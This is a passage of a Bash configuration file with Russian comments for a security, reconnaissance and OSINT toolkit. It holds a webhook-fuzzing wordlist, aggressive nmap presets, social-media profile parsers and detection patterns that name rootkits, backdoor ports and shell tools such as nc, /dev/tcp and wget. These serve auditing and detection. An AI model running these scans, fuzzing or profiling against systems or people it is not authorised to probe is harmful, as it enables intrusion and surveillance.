    # --- 10. Поведенческие индикаторы (Anomaly Detection) ---
    '\b(brute_force|login_attempt|multiple_failed|ip_blacklist|geo_block|suspicious_user_agent|credential_stuffing|session_hijack)\b'
)



# ==============================================================================
# 10. СЛОВАРЬ ФАЗЗИНГА ВЕБХУКОВ И API ЭНДПОИНТОВ (ULTIMATE WEBHOOK WORDLIST)
# ==============================================================================
GLOBAL_WEBHOOK_WORDLIST=(
    # --- Версионированные API и Точки Входа (Core API Routs) ---
    "api"
    "api/v1"
    "api/v2"
    "api/v3"
    "api/v4"
    "rest/v1"
    "rest/v2"
    "v1/api"
    "v2/api"
    "graphql"
    "api/graphql"
    
    # --- Универсальные Вебхуки (Generic Webhooks) ---
    "webhook"
    "webhooks"
    "hooks"
    "hook"
    "api/webhook"
    "api/webhooks"
    "api/hooks"
    "v1/webhooks"
    "v2/webhooks"
    "webhooks.json"
    "webhook.php"
    
    # --- Мессенджеры и Чат-боты (Messengers & Bots) ---
    "tg-hook.php"
    "telegram-webhook"
    "telegram/webhook"
    "api/telegram"
    "slack-hook"
    "slack/webhook"
    "api/slack"
    "discord-webhook"
    "discord/webhook"
    "teams-webhook"
    
    # --- Финансовые и Платежные Шлюзы (FinTech & Payment Gateways) ---
    "stripe-webhook"
    "stripe/webhook"
    "api/stripe"
    "paypal-webhook"
    "paypal/webhook"
    "api/paypal"
    "braintree-webhook"
    "razorpay-webhook"
    "shopify-webhook"
    "shopify/webhook"
    
    # --- Разработка, CI/CD и Облака (DevOps & Cloud Providers) ---
    "git-hook"
    "github-webhook"
    "github/webhook"
    "gitlab-webhook"
    "gitlab/webhook"
    "bitbucket-webhook"
    "jenkins-webhook"
    "jira-webhook"
    "aws-webhook"
    "firebase-webhook"
    
    # --- CRM, Маркетинг и Телефония (SaaS, Marketing & Telephony) ---
    "mailchimp-webhook"
    "sendgrid-webhook"
    "twilio-webhook"
    "twilio/webhook"
    "hubspot-webhook"
    "hubspot/webhook"
    "amocrm-webhook"
    "bitrix-webhook"
)


# ==============================================================================
# @description: ГЛОБАЛЬНЫЕ СИГНАЛЫ СКРЫТЫХ СЕТЕЙ И WEB3-МАРШРУТОВ (POSIX ERE)
# МОДЕРНИЗАЦИЯ: Исправлен синтаксис (удален (?i)), адаптирован под grep -Ei
# ==============================================================================

# Паттерн покрывает .onion (v3), .i2p (base32 и имена), и альтернативные доменные зоны
GLOBAL_REGEX_DARKWEB="([[:<:]][a-z2-7]{56}\.onion[[:>:]]|[[:<:]][a-z0-9]{52}\.b32\.i2p[[:>:]]|[[:<:]][a-z0-9_-]+\.i2p[[:>:]]|[[:<:]]([a-f0-9]{1,4}:){7}[a-f0-9]{1,4}[[:>:]]|[[:<:]].(bit|lib|coin|bazar|emc|onion|i2p|ygg)[[:>:]])"


# ==============================================================================
# SYSTEM CORE: СИСТЕМНЫЕ ЛИМИТЫ И ИНТЕРФЕЙСЫ БЕЗОПАСНОСТИ
# ==============================================================================

# Динамический регулятор числовых диапазонов меню (Лимит по умолчанию)
# Используется как дефолтный extra-параметр для валидатора "range"
GLOBAL_CORE_MENU_MAX_LIMIT=99

# ==============================================================================
# ЕДИНЫЙ РЕЕСТР HTTP-ИНТЕРФЕЙСОВ (HTTP-NEXUS: ULTIMATE FULL-STACK)
# ==============================================================================
GLOBAL_HTTP_MATRIX=(
    # --- 1. Инфраструктурный слой (Server/CDN/Edge/Proxy) ---
    '\b(server|via|x-asf-by|x-powered-by-plesk|x-advertising|x-responder|x-served-by|x-cached-by|x-cache|x-edge-location|x-amz-server-side-encryption|x-kong-proxy-latency|x-envoy-upstream-service-time|cf-ray|kiwi-id|x-proxy-id|x-cluster-id)\b'
    
    # --- 2. Runtime слой (Frameworks/CMS/API) ---
    '\b(x-powered-by|x-runtime|x-version|x-aspnet-version|x-aspnetmvc-version|x-cocoa-version|x-generator|x-cms|x-nextjs-cache|x-nuxt-cache|x-redirected-by|x-framework|x-application-context|wp-super-cache|x-drupal-cache|x-varnish|x-api-key|x-request-id)\b'
    
    # --- 3. Security & Auth Shield (Заголовки безопасности и контроля) ---
    '\b(content-security-policy|x-frame-options|x-content-type-options|strict-transport-security|x-xss-protection|referrer-policy|permissions-policy|cross-origin-embedder-policy|cross-origin-opener-policy|cross-origin-resource-policy|access-control-allow-origin|www-authenticate|proxy-authenticate|authorization|set-cookie)\b'
    
    # --- 4. Протокольный слой (HTTP/2, HTTP/3, QUIC) ---
    '^(http/|h2|h3|alt-svc)'
    
    # --- 5. Заголовки отладки и трассировки (Debug/DevOps) ---
    '\b(x-debug-token|x-debug-token-link|x-profiler|x-application-context|x-node-id|x-backend-id)\b'
)


# ==============================================================================
# ЕДИНЫЙ РЕЕСТР WHOIS И ИНФРАСТРУКТУРНОЙ РАЗВЕДКИ (WHOIS-NEXUS: ULTIMATE FULL-STACK)
# ==============================================================================
GLOBAL_WHOIS_MATRIX=(
    # --- 1. Identity Layer (Регистраторы, Органы, Лица) ---
    '\b(registrar|reg-name|sponsoring|org|organization|registrant|person|descr|tech-id|mnt-by|contact|role|admin-c|bill-c|tech-c)\b'
    
    # --- 2. Lifecycle Layer (Жизненный цикл и временные метки) ---
    '\b(expires|expired|exp-date|paid-till|validity|free-date|created|creation[-_ ]date|registered|reg-date|changed|modified|updated|renewal-date)\b'
    
    # --- 3. Delegation Layer (DNS/Маршрутизация/IP) ---
    '\b(nserver|name[-_ ]server|ns[0-9]{1,2}|dnssec|ds-record|ip-address|glue-record)\b'
    
    # --- 4. Privacy Shield Layer (GDPR/Обфускация) ---
    '\b(privat[a-z]*|protect[a-z]*|gdpr|redacted|anonymous|hidden|masked|data-protected|privacy-proxy|contact-privacy)\b'
    
    # --- 5. Status Layer (Техническое состояние) ---
    '\b(status|domain-status|state|server-transfer|client-hold|client-delete|server-lock|inactive|parked|redemptionperiod)\b'
    
    # --- 6. Cyber-Scouting & Automation (Специфические метки) ---
    '\b(source|query-time|last-update-of-whois|for-inquiries|abuse-contact|registrar-abuse-contact|website|reference)\b'
)


# ==============================================================================
# @description: СВОДНЫЙ КОМПОЗИТ WHOIS (POSIX ERE COMPOSITE)
# МОДЕРНИЗАЦИЯ: Синтаксис адаптирован для объединения атомарных матриц.
# ==============================================================================
# Этот композит объединяет все уровни разведки WHOIS в единый фильтр
GLOBAL_SIG_WHOIS_MATRIX="($GLOBAL_REGEX_WHOIS_REG|$GLOBAL_REGEX_WHOIS_DATES|$GLOBAL_REGEX_WHOIS_NS|$GLOBAL_REGEX_WHOIS_PRIVACY)"


# ==============================================================================
# @description: ГЛОБАЛЬНЫЕ СИСТЕМНЫЕ ПРЕДОХРАНИТЕЛИ (POSIX ERE)
# МОДЕРНИЗАЦИЯ: Исправлен синтаксис, адаптирован под grep -Ei
# ==============================================================================

# ==============================================================================
# ЕДИНЫЙ РЕЕСТР СИСТЕМНЫХ ПРЕДОХРАНИТЕЛЕЙ И ПЕРИМЕТРОВ (SYS-FUSE: INTEGRAL v3.0)
# ==============================================================================
# АРХИТЕКТУРА: Полная совместимость с POSIX ERE движками (grep -Ei, [[ =~ ]])
# МОДЕРНИЗАЦИЯ: Интеграция слоя FORENSIC & PURGE (Детекция деструктивных статусов)
# НАЗНАЧЕНИЕ: Защита ядра от краха, предотвращение ложных блокировок (Whitelisting),
#             фильтрация сокетов и снайперский Incident Response аномалий ОЗУ.
# СТАТУС: MAXIMUM PRODUCTION POWER | NO SHORTENINGS | DETAILED PARAMETERS
# ==============================================================================
GLOBAL_SYSTEM_FUSE_MATRIX=(
    # --- 0. ИНДУСТРИАЛЬНЫЙ БЕЛЫЙ СПИСОК ПРОЦЕССОВ [LAYER 1: PROC_WHITELIST] ---
    # Защита от случайного прерывания (kill -9) критически важных демонов, шеллов, гипервизоров и ядра.
    # Включает подсистемы журналирования, управления контейнерами, сетями и политиками безопасности.
    '^(systemd|init|sshd|bash|sh|zsh|tmux|screen|adb|dockerd|containerd|podman|kthreadd|kworker.*|ksoftirqd.*|migration.*|rcu_sched|auditd|rsyslogd|systemd-journald|systemd-resolved|systemd-logind|systemd-networkd|dbus-daemon|udevd|agetty|login|fail2ban-server|apparmor|selinux|ufw|iptables|cron|crond|atd|libvirtd|qemu-kvm|lvmetad|multipathd|polkitd|chronyd|ntpd|acpid|unattended-upgrades|ntp|dnsmasq|nginx|apache2|httpd)$'

    # --- 1. МАТРИЦА ОПАСНЫХ ПОРТОВ [LAYER 2: DANGER_PORTS] ---
    # Расширенный периметр: порты бэкдоров, реверс-шеллов, прокси, СУБД без авторизации,
    # а также порты управления актуальных C2 (Sliver, Havoc, Cobalt Strike) и майнинг-протоколов.
    '^(4444|55555|6666|7777|8888|9999|31337|1337|9001|8080|4443|65534|2022|8000|1080|5000|54321|4000|4545|8333|14337|3306|5432|6379|27017|9200|11211|50050|40056|51110|53190)$'

    # --- 2. БЕЛЫЙ СПИСОК ПОРТОВ УПРАВЛЕНИЯ И ИНФРАСТРУКТУРЫ [LAYER 3: PORT_WHITELIST] ---
    # Легитимные порты системных служб, веб-серверов, Kubernetes API, отладки ADB,
    # а также стэка мониторинга (Prometheus, Grafana, Node Exporter) и почтовых протоколов.
    '^(22|80|443|5037|5555|2376|6443|9100|3000|9090|2379|10250|25|465|587|993|995|1194|51820|53|123)$'

    # --- 3. МАСКА КРИТИЧЕСКИХ СИСТЕМНЫХ ФАЙЛОВ [LAYER 4: QUARANTINE_WHITELIST] ---
    # Файлы-исключения, которые антивирусный модуль НЕ имеет права перемещать, удалять или обнулять.
    # Защищает файлы конфигурации, криптографические ключи, базы данных, модули ядра и системные юниты init.
    '\.(conf|lock|uuid|db|sqlite|sqlite3|passwd|shadow|journal|log|key|crt|pem|fstab|modules|environment|service|target|path|timer|so|so\.[0-9]+|bak|opts|rules|policy)$'

    # --- 4. ПАТТЕРНЫ ДЕТЕКЦИИ АНОМАЛЬНЫХ И ДЕСТРУКТИВНЫХ СТАТУСОВ [LAYER 5: BAD_PROC_STATUS] ---
    # Строгий Incident Response стек для вычисления скомпрометированных и зависших состояний:
    # Z (Zombie - мертвые ветки малвари), D (Uninterruptible Sleep - блокировка ядра I/O инжектами),
    # T (Stopped - приостановленные скрытые шеллы), t (Traced - процессы под сторонней отладкой / хуками).
    '^[ZDTt]$'
)

# ==============================================================================
# NETWORK INTELLIGENCE LAYER: ГЛОБАЛЬНЫЕ МАТРИЦЫ СЕТЕВОГО АУДИТА (УЛЬТИМАТИВНЫЕ)
# Конфигурация гибридного сканирования, обхода систем фильтрации и OSINT-топологии
# ==============================================================================

# 1. Отказоустойчивый резервный диапазон (Дефолтная маска внутренней инфраструктуры)
GLOBAL_NET_FALLBACK_RANGE="192.168.1.0/24"

# 2. ПРИВИЛЕГИРОВАННЫЙ РЕЖИМ ЯДРА (ROOT-ДОСТУП) — МАКСИМАЛЬНЫЙ СТЕК АТАК
# Конфигурация «STEALTH & COMPREHENSIVE»: Трассировка пакетов, SYN-скан (-sS), 
# определение ОС (-O), версий софта (-sV), агрессивный тайминг (-T4) и обход IDS.
GLOBAL_NMAP_ROOT_ARGS="-sS -sV -O -p22,80,443,4444,5555,8080 -T4 -n --max-retries 2 --packet-trace"

# Конфигурация «TOTAL DESTROYER»: Тотальный аудит всех 65535 портов с UDP-разведкой (-sU)
GLOBAL_NMAP_ROOT_DEEP_ARGS="-sS -sU -sV -p- -T4 -Pn -n --disable-arp-ping --randomize-hosts"


# 3. БЕСПРАВНЫЙ РЕЖИМ ЯДРА (NON-ROOT / TERMUX / SAMSUNG A14)
# Конфигурация «FAST LIVE DETECT»: Обход ICMP-блокировок. TCP Connect-скан (-sT) 
# по ключевым портам управления, работающий через стандартные системные сокеты.
GLOBAL_NMAP_NON_ROOT_ARGS="-sT -p22,80,443,5555,8080 -T4 -n --unprivileged --open"

# Конфигурация «NON-ROOT EXTENDED»: Глубокий аудит портов без Root-прав с определением баннеров сервисов
GLOBAL_NMAP_NON_ROOT_DEEP_ARGS="-sT -sV --top-ports 100 -T4 -Pn -n --unprivileged"

# Интервал паузы (в секундах) между циклами автономного сканирования периметра
GLOBAL_NET_AUTONOMOUS_DELAY=300

# 4. СИГНАТУРНЫЕ ФИЛЬТРЫ ОЧИСТКИ ТЕКСТОВОГО ПОТОКА NMAP
# Паттерны для снайперского парсинга вывода во избежание засорения консоли лаунчера
# ==============================================================================
# @description: ГЛОБАЛЬНЫЙ ПАТТЕРН ДЕТЕКЦИИ ОТЧЕТОВ СЕТЕВОГО СКАНИРОВАНИЯ
# МОДЕРНИЗАЦИЯ: Исправлен синтаксис (удален (?i)), адаптирован под grep -Ei
# ==============================================================================
# Использование: grep -Ei "$GLOBAL_REGEX_NET_REPORT"
GLOBAL_REGEX_NET_REPORT="Nmap[[:space:]]+scan[[:space:]]+report[[:space:]]+for"
GLOBAL_REGEX_NET_PORT_LINE="^[0-9]+/(tcp|udp)"

# ==============================================================================
# ЕДИНЫЙ РЕЕСТР СЕТЕВОЙ ИЗОЛЯЦИИ (NET-NEXUS: ULTIMATE FULL-STACK v2.0)
# ==============================================================================
GLOBAL_NET_MATRIX=(
    # --- 1. IPv4: Loopback & Localhost ---
    '\b127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\b'
    '\b(localhost|localhost\.localdomain|0\.0\.0\.0)\b'
    
    # --- 2. IPv4: RFC 1918 (Private Networks) ---
    '\b10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\b'
    '\b172\.(1[6-9]|2[0-9]|3[0-1])\.[0-9]{1,3}\.[0-9]{1,3}\b'
    '\b192\.168\.[0-9]{1,3}\.[0-9]{1,3}\b'
    
    # --- 3. IPv4: Special Use (APIPA, Multicast, Broadcast, Experimental) ---
    '\b169\.254\.[0-9]{1,3}\.[0-9]{1,3}\b'
    '\b224\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\b'
    '\b255\.255\.255\.255\b'
    '\b(240|241|242|243|244|245|246|247|248|249|250|251|252|253|254)\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\b'
    
    # --- 4. IPv6: Local/Unique Local Addresses (ULA) ---
    '\b(fe80|fc00|fd00):[0-9a-fA-F:]*\b'
    '\b(::1|::)\b'
)

# ==============================================================================
# ЕДИНЫЙ РЕЕСТР АНАЛИЗА ИСХОДНОГО КОДА (SAST-NEXUS: ULTIMATE FULL-STACK v2.0)
# ==============================================================================
GLOBAL_SAST_MATRIX=(
    # --- 1. Секреты и конфигурационные утечки ---
    '\b(mysqli?_connect|PDO|db_(password|user|pass|name|host|uri)|mysql_connect|pg_connect|createConnection|MongoClient|mongoose\.connect|sqlite3\.Database|DATABASE_URL|DB_(USERNAME|PASSWORD|DATABASE|HOST|SECRET|KEY))\b'
    
    # --- 2. Точки входа и API-инъекции ---
    '\b(_POST|_GET|_REQUEST|_SERVER|req\.(body|query|params|cookies)|request\.(form|args|json|get_json)|@RequestParam|@RequestBody|@PathVariable|ParamUtil|r\.(FormValue|PostForm)|x-api-key)\b'
    
    # --- 3. RCE и исполнение команд ---
    '\b(exec(ve|lp|p)?|system|passthru|shell_exec|popen|pclose|proc_open|subprocess\.(run|Popen|call|check_output)|child_process\.(exec|spawn|fork)|os\.(system|popen|spawn)|Runtime\.getRuntime\(\)\.exec|ProcessBuilder|syscall\.Exec)\b'
    
    # --- 4. LFI, RFI и файловые операции ---
    '\b(fopen|file_get_contents|include(_once)?|require(_once)?|readfile|file|parse_ini_file|open|read|fs\.(readFile|readFileSync|createReadStream)|io\.ReadFile|ioutil\.ReadFile|os\.Open|fs\.file_System|FileInputStream|FileReader)\b'
    
    # --- 5. Векторы десериализации (Критический риск) ---
    '\b(unserialize|pickle\.(load|loads)|yaml\.(load|unsafe_load)|json\.parse|fastjson|readObject|XMLDecoder|XStream)\b'
    
    # --- 6. XSS и Инъекционные Sink-функции ---
    '\b(eval\(|base64_decode|innerHTML|outerHTML|document\.write|dangerouslySetInnerHTML|v-html|triple-curly|htmlspecialchars|strip_tags)\b'
)

# ==============================================================================
# ЕДИНЫЙ РЕЕСТР ВИЗУАЛИЗАЦИИ СИГНАЛОВ (UI-NEXUS: ULTIMATE v3.0)
# ==============================================================================
# Цветовые константы (ANSI)
C='\033[1;36m'  # Cyan: Сеть / Инфраструктура
Y='\033[1;33m'  # Yellow: Секреты / Auth / Credentials
G='\033[1;32m'  # Green: Success / Hits / Found
R='\033[1;31m'  # Red: Exploits / CVE / SQL-Errors
P='\033[1;35m'  # Purple: HTTP-Headers / API-Tracing
NC='\033[0m'    # Reset

GLOBAL_UI_MATRIX=(
    # --- 1. Продвинутые секреты и API-ключи (Yellow) ---
    # Улучшено для захвата токенов с разными разделителями (=>, :=, :)
    '-e s/\([Pp][Aa][Ss][Ss][Ww][Oo][Rr][Dd]\|[Ss][Ee][Cc][Rr][Ee][Tt]\|[Aa][Pp][Ii]_[Kk][Ee][Yy]\|[Tt][Oo][Kk][Ee][Nn]\|[Aa][Uu][Tt][Hh]\)[\x27\"\ \=]*[:=>\ ]+[\x27\"\ ]*[A-Za-z0-9_\.\-\/]{16,}/'$Y'&'$NC'/g'
    
    # --- 2. Сетевая инфраструктура и Облачные метаданные (Cyan) ---
    # Теперь детектит IPv4, а также метаданные AWS/GCP (169.254.x.x)
    '-e s/\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}\(:[0-9]\{1,5\}\)\?/'$C'&'$NC'/g'
    
    # --- 3. Инфраструктурный API-трейсинг (Purple) ---
    # Захватывает не только X-заголовки, но и трассировку запросов
    '-e s/\(X-[A-Za-z0-9-]*\|[Rr][Ee][Qq][Uu][Ee][Ss][Tt]-[Ii][Dd]\):[[:space:]]*[A-Za-z0-9_\.\-]*/'$P'&'$NC'/g'
    
    # --- 4. Статус "Успех" и Индикаторы присутствия (Green) ---
    '-e s/\([Ss][Uu][Cc][Cc][Ee][Ss][Ss]\|[Hh][Ii][Tt]\|[Ff][Oo][Uu][Nn][Dd]\|[Cc][Oo][Nn][Nn][Ee][Cc][Tt][Ee][Dd]\|[Ee][Xx][Ii][Ss][Tt][Ss]\)/'$G'&'$NC'/g'
    
    # --- 5. Безопасность: Атаки, CVE, Уязвимости и SQL-инъекции (Red) ---
    # Добавлены паттерны SQL-инъекций и критических сбоев ядра
    '-e s/\([Vv][Uu][Ll][Nn][Ee][Rr][Aa][Bb][Ll][Ee]\|[Ee][Xx][Pp][Ll][Oo][Ii][Tt]\|[Cc][Vv][Ee]-[0-9]\{4\}-[0-9]\{4,7\}\|[Ss][Qq][Ll]_[Ee][Rr][Rr][Oo][Rr]\|[Aa][Ll][Ee][Rr][Tt]\|[Dd][Rr][Oo][Pp]\|[Uu][Nn][Ii][Oo][Nn]\|[Ss][Ee][Ll][Ee][Cc][Tt]\)/'$R'&'$NC'/g'
)

# ==============================================================================
# ЕДИНЫЙ РЕЕСТР ФОРЕНЗИКИ И АНАЛИЗА ЯДРА (FORENSIC-NEXUS: ULTIMATE FULL-STACK v3.0)
# ==============================================================================
FORENSIC_MATRIX=(
    # --- 1. Kernel Layer: Руткиты, eBPF-инжекты и модификация таблиц ---
    '\b(rootkit|stealth|hide_proc|hook_sys|diamorphine|reptile|suterusu|kbeast|vlany|adore|enlight|mafalda|backdoor|rkstub|adore_ng|hpork|kbdv|knark|override|pridels|rialto|sucikit|tcunyc|zaurus|m0nad|wnps|fcomm|jynx|bdflush|skidmap|ebpf_control|kneedeeep|TripleCross|Jeefo|Umbreon|Azazel|Bedep|Volcani|Kinsing|Sysrv|Tsunami|Muhstik|sys_call_table|wp_page_fault|kprobe|ftrace_lookup|module_layout|kmem_cache|dentry_hook|task_struct_hide)\b'

    # --- 2. Container Escape & Runtime Anomalies (Cloud Native) ---
    '\b(nsenter|unshare|pivot_root|ptrace|cap_sys_admin|container_escape|docker_sock|runc_exploit|cgroup_v2_manipulation|proc_self_mem|memfd_create)\b'

    # --- 3. Document Layer: Скрытые исполняемые цепочки (PDF/Office) ---
    '\/([Jj][Ss]|[Jj][Aa][Vv][Aa][Ss][Cc][Rr][Ii][Pp][Tt]|[Oo][Pp][Ee][Nn][Aa][Cc][Tt][Ii][Oo][Nn]|[Aa][Aa]|[Aa][Cc][Rr][Oo][Ff][Oo][Rr][Mm]|[Jj][Bb][Ii][Gg]2[Dd][Ee][Cc][Oo][Dd][Ee]|[Rr][Ii][Cc][Hh][Mm][Ee][Dd][Ii][Aa]|[Ll][Aa][Uu][Nn][Cc][Hh]|[Ee][Mm][Bb][Ee][Dd][Dd][Ee][Dd][Ff][Ii][Ll][Ee]|[Vv][Bb][Aa][Mm][Aa][Cc][Rr][Oo]|[Oo][Cc][Xx]|[Cc][Mm][Dd])'

    # --- 4. Execution Layer: LOLBAS и скриптовые инъекции ---
    '\.(exe|scr|vbs|bat|ps1|js|vbe|cmd|jar|lnk|hta|cpl|inf|wsf|sh|py|pl|rb|msi|vba|ws|scf|com|pif|gadget|iso|vhd|img|elf|so|ko)$'
    '\b(powershell|cmd\.exe|wmic|bitsadmin|certutil|rundll32|regsvr32|curl|wget|bash|nc|netcat|socat|/dev/tcp|perl|python3|ruby|node)\b'

    # --- 5. Obfuscation & Persistence Layer (Advanced) ---
    '\b(UPX!|ASPack|Enigma|Themida|MPRESS|VMProtect|PECompact|Petite|FSG!|PESpin|ConfuserEx|Dotfuscator|SmartAssembly|Yano|Goliath|Babel|CryptoObfuscator|Spox|Obsidium|Armadillo|base64_decode|gzinflate|eval|str_rot13)\b'
)


# ==============================================================================
# GLOBAL PLATFORM IDENTIFIERS (ULTIMATE LINK PARSING MATRIX v16.0 - AUTO_PARSE)
# ==============================================================================
# Формат: "ПЛАТФОРМА|REGEX|GROUP|MODE"
# [AUTO_PARSE] - триггер для глубокого анализа структуры профиля
# [LINK_ONLY]  - использование только как источник связей
# ==============================================================================
GLOBAL_PLATFORM_IDENTIFIERS=(
    "Facebook|facebook\.com/(?:profile\.php\?id=)?([a-zA-Z0-9.]+)|1|[AUTO_PARSE]"
    "Instagram|instagram\.com/([a-zA-Z0-9._]+)|1|[AUTO_PARSE]"
    "TikTok|tiktok\.com/(?:@[a-zA-Z0-9._]+|t/)([a-zA-Z0-9._]+)|1|[AUTO_PARSE]"
    "X_Twitter|(?:x|twitter)\.com/([a-zA-Z0-9._]+)|1|[AUTO_PARSE]"
    "YouTube|youtube\.com/(?:@|user/|c/)?([a-zA-Z0-9._-]+)|1|[LINK_ONLY]"
    "Telegram|(?:t\.me|telegram\.me)/([a-zA-Z0-9._]+)|1|[AUTO_PARSE]"
    "Reddit|reddit\.com/user/([a-zA-Z0-9_-]+)|1|[LINK_ONLY]"
    "GitHub|github\.com/([a-zA-Z0-9-]+)|1|[AUTO_PARSE]"
    "LinkedIn|linkedin\.com/in/([a-zA-Z0-9_-]+)|1|[AUTO_PARSE]"
)

# ==============================================================================
# ЕДИНЫЙ РЕЕСТР ФИЛЬТРАЦИИ И OSINT-ГИГИЕНЫ (OSINT-NEXUS: ULTIMATE v2.0)
# ==============================================================================
GLOBAL_OSINT_MATRIX=(
    # --- 1. System/Infrastructure Noise (Emails & Domains) ---
    '\b([a-z0-9._%+-]+@)?(google|duckduckgo|bing|yahoo|yandex|baidu|w3|schema|ietf|githubusercontent|cloudfront|amazonaws|akamai|gtech|adsystem|doubleclick|analytics|crashlytics|sentry|facebook|twitter|instagram|tiktok|pinterest|linkedin|telegram|discord|whatsapp)\.(com|org|net|io|co|uk|de|ru|fr|es|it)\b'
    '\b(reply|noreply|support|admin|info|contact|feedback|marketing|sales|billing|jobs|careers|privacy|terms|abuse|postmaster|root|webmaster|localhost|example|test|dev|null|mail|service|noreply)\b'
    '\.(png|jpg|jpeg|gif|ico|svg|webp|css|js|json|xml|pdf|zip|tar|gz|exe|dmg|mp4|woff|woff2|wasm|sh|log|tmp|bak|sqlite)\b'

    # --- 2. URL Path Noise (Social, Tracking & Web UI) ---
    '\/(search|privacy|help|login|signin|signup|logout|register|account|status|sharer|share|cookie|settings|preferences|tos|legal|about|contact|support|faq|feedback|explore|trending|notifications|messages|chat|feed|rss|tags|category|archive|pages|blog|posts|reels|stories|shorts|video|photos|audio|music|maps|events|groups|marketplace|ads|advertising|analytics|developer|api|manage|billing|security|forgot-password|reset-password|verify|captcha|oauth|callback|redirect|goto|exit|click|track|iframe|embed|widget|assets|static|media|download|upload|view|preview|print|checkout|cart|shop|store|buy|purchase|subscribe|unsubscribe|newsletter)\b'
    
    # --- 3. Advanced AdTech & Fingerprinting (New 2026 Layer) ---
    '\b(doubleclick|googletagmanager|adsense|adservice|optimizely|hotjar|newrelic|datadog|segment|mixpanel|amplitude|branch|adjust|appsflyer)\b'
    '\/(pixel|track|click|beacon|log|gclid|fbclid|utm_source|utm_medium|utm_campaign|utm_term|utm_content)\b'
)

# ==============================================================================
# GLOBAL FALLBACK SEARCH GATEWAYS (ULTIMATE ANTI-CAPTCHA ROUTING v15.5)
# ==============================================================================
# Массив резервных легковесных зеркал, отдающих чистый HTML без JS-валидации.
# Диверсификация: Конфиденциальные поисковики, Мета-агрегаторы, Альтернативные индексы.
GLOBAL_FALLBACK_SEARCH_GATES=(
    # --- Кластер А: Конфиденциальные HTML-фронтенды и Альтернативные индексы ---
    "https://html.duckduckgo.com/html/?q="
    "https://search.brave.com/search?q="
    "https://www.mojeek.com/search?q="
    "https://www.gibiru.com/results.html?q="
    
    # --- Кластер Б: Глобальные Мета-поисковые движки и Агрегаторы ---
    "https://search.yahoo.com/search?p="
    "https://search.aol.com/aol/search?q="
    "https://www.ask.com/web?q="
    "https://results.excite.com/serp?q="
    "https://www.search-results.com/web?q="
    "https://www.info.com/serp?q="
    
    # --- Кластер В: Публичные верифицированные узлы SearXNG (Мета-сборщики) ---
    "https://searx.be/search?q="
    "https://search.ononoki.org/search?q="
    "https://searx.fmac.xyz/search?q="
    "https://priv.au/search?q="
    
    # --- Кластер Г: Социальные и текстовые поисковые агрегаторы индексов ---
    "https://old.reddit.com/search?q="
)


# ==============================================================================
# GLOBAL SHORT LINK & REDIRECT PATTERNS (ULTIMATE RESOLVER MATRIX v16.0)
# ==============================================================================
# ==============================================================================
# @description: УЛЬТИМАТИВНАЯ МАТРИЦА ПЕРЕХВАТА РЕДИРЕКТОВ (POSIX ERE)
# МОДЕРНИЗАЦИЯ: Исправлен синтаксис (удален (?i)), адаптирован под grep -Ei
# ==============================================================================
# Покрывает: соцсети, мобильные deep-links, био-агрегаторы и коммерческие shorteners
GLOBAL_SHORT_LINK_REDIRECT_REGEX="(facebook\.com/share/|fb\.(watch|me)|vt\.tiktok\.com|instagram\.com/share|t\.(co|me/share)|youtu\.be/|lnkd\.in/|wa\.me/|vk\.cc|goo\.su|clck\.ru|bit\.ly|tinyurl\.com|cutt\.ly|shorturl\.at|linktr\.ee|lnk\.bio|ow\.ly|buff\.ly|rebrand\.ly|is\.gd|u\.to|shrtco\.de|viber\.click|tt\.me|line\.me|pin\.it|snapchat\.com/add/|bl\.ink|t2m\.io|adf\.ly|b23\.tv|gg\.gg|v\.gd|urlshrt\.me|click\.ru|ok\.me)"

# ==============================================================================
# GLOBAL MULTI-ENGINE SEARCH MATRIX (OSINT BROADCAST STRATEGY v20.0 COMPLETE)
# ==============================================================================
# Ультимативный массив базовых поисковых систем глобального покрытия.
# Все узлы форсированы: отключен JS/CSS, деактивирована персонализация (No-Cookie/PWS),
# сняты фильтры цензуры контента и выставлен максимальный лимит вывода сниппетов.
GLOBAL_SEARCH_ENGINES=(
    # --- GOOGLE SYSTEMS CORE (Глобальный поисковый стандарт) ---
    "Google|https://www.google.com/search?q=%VECTOR%&num=30&gbv=1-A&hl=en&pws=0&safe=off"
    
    # --- BING ENTERPRISE CORPS (Глубокие архивы, старые кэши сайтов, домены) ---
    "Bing|https://www.bing.com/search?q=%VECTOR%&count=30&setlang=en-US&first=1&adlt=off"
    
    # --- YAHOO INDEX (Глобальный парсинг блогов, досок объявлений и старых связей) ---
    "Yahoo|https://search.yahoo.com/search?p=%VECTOR%&n=30&b=1&ei=UTF-8&fr=none"
    
    # --- YANDEX INDUSTRIAL CORE (Ультимативный пробив СНГ, VK, OK, баз данных, объявлений) ---
    # Параметры: numdoc=30 (лимит), lr=213 (глобальный индекс), family=0 (без фильтрации контента)
    "Yandex|https://yandex.ru/search/touch/?text=%VECTOR%&numdoc=30&lr=213&family=0&nocache=1"
    
    # --- DUCKDUCKGO STEALTH LITE (Анонимный HTML-фронтенд без трекеров и JS) ---
    "DuckDuckGo|https://html.duckduckgo.com/html/?q=%VECTOR%&kd=-1&kh=1"
    
    # --- MOJEEK INDEPENDENT ENGINE (Собственный уникальный краулер Великобритании, обход DMCA) ---
    "Mojeek|https://www.mojeek.com/search?q=%VECTOR%&n=30&fmt=html"
    
    # --- QWANT EUROPEAN MATRIX (Европейский защищенный индекс, игнорирующий цензуру США) ---
    "Qwant|https://www.qwant.com/?q=%VECTOR%&t=web&f=all"
    
    # --- BAIDU ASIAN CORE (Азиатский сегмент, игровые платформы, криптофорумы, мессенджеры) ---
    # Параметры: rn=30 (выдача 30 результатов), cl=3 (веб-поиск)
    "Baidu|https://www.baidu.com/s?wd=%VECTOR%&rn=30&cl=3&tn=baidulocal"
)

# ==============================================================================
# РЕЕСТР ДЕТЕКЦИИ БЛОКИРОВОК И WAF-ПОДАВЛЕНИЯ (ANTI-FLOOD-NEXUS: ULTIMATE FULL)
# ==============================================================================
GLOBAL_ANTI_FLOOD_MATRIX=(
    # --- 1. Linguistic & Logic Blocks (En/Ru/Fr/De/Es) ---
    '\b(detected unusual traffic|access denied|подозрительный запрос|доступ ограничен|accès refusé|zugriff verweigert|acceso denegado)\b'
    '\b(captcha|robot|робот|вы робот|êtes-vous un robot|sind sie ein roboter|es usted un robot)\b'
    
